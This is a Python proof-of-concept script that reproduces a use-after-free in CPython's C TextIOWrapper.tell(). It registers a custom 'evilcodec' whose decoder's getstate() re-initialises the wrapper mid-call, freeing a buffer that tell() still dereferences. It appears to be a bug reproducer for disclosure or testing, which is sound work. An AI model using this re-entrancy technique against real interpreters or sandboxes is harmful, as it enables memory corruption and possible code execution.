"""TextIOWrapper.tell(): borrowed `next_input` out of self->snapshot is
dereferenced after decoder.getstate() ran arbitrary Python.

Modules/_io/textio.c:2873   PyArg_ParseTuple(self->snapshot, "iO", &..., &next_input)   <- borrowed
Modules/_io/textio.c:2889   saved_state = self->decoder.getstate()                      <- user Python
Modules/_io/textio.c:2937   assert(skip_bytes <= PyBytes_GET_SIZE(next_input))          <- UAF read
Modules/_io/textio.c:2938   input = PyBytes_AS_STRING(next_input)                       <- UAF
Modules/_io/textio.c:2982   input_end = input + PyBytes_GET_SIZE(next_input)            <- UAF read

The re-entrant getstate() calls tw.__init__(...), whose Py_CLEAR(self->snapshot)
at textio.c:1220 drops the only reference to next_input.

Usage:  python tell_snapshot_uaf.py [--pyio]
"""

import codecs
import sys

USE_PYIO = "--pyio" in sys.argv
if USE_PYIO:
    import _pyio as io
else:
    import io

CHUNK = 1 << 16
DATA = b"A" * (CHUNK * 4)

tw = None
fired = False
armed = False


class EvilDecoder(codecs.IncrementalDecoder):
    def __init__(self, errors="strict"):
        self.errors = errors

    def decode(self, input, final=False):
        return bytes(input).decode("latin-1")

    def getstate(self):
        global fired
        if armed and not fired:
            fired = True
            # Re-entrant re-initialisation: textio.c:1220 Py_CLEAR(self->snapshot)
            # frees the tuple, and with it the `next_input` bytes the caller
            # frame is still holding a raw pointer to.
            tw.__init__(io.BytesIO(b"B" * 64), encoding="evilcodec", newline="\n")
        return (b"", 0)

    def setstate(self, state):
        pass

    def reset(self):
        pass


class EvilEncoder(codecs.IncrementalEncoder):
    def encode(self, input, final=False):
        return input.encode("latin-1")

    def reset(self):
        pass

    def getstate(self):
        return 0

    def setstate(self, state):
        pass


def _search(name):
    if name != "evilcodec":
        return None
    return codecs.CodecInfo(
        name="evilcodec",
        encode=lambda s, errors="strict": (s.encode("latin-1"), len(s)),
        decode=lambda b, errors="strict": (bytes(b).decode("latin-1"), len(b)),
        incrementalencoder=EvilEncoder,
        incrementaldecoder=EvilDecoder,
    )


codecs.register(_search)

tw = io.TextIOWrapper(io.BytesIO(DATA), encoding="evilcodec", newline="\n")
tw._CHUNK_SIZE = CHUNK
tw.read(1)  # populate self->snapshot and make decoded_chars_used == 1
armed = True  # only detonate from inside tell(), not from read()'s own getstate()
print("before tell", flush=True)
try:
    r = tw.tell()
except Exception as exc:  # noqa: BLE001
    print("tell raised", type(exc).__name__, exc, flush=True)
else:
    print("tell returned", r, flush=True)
print("survived", flush=True)
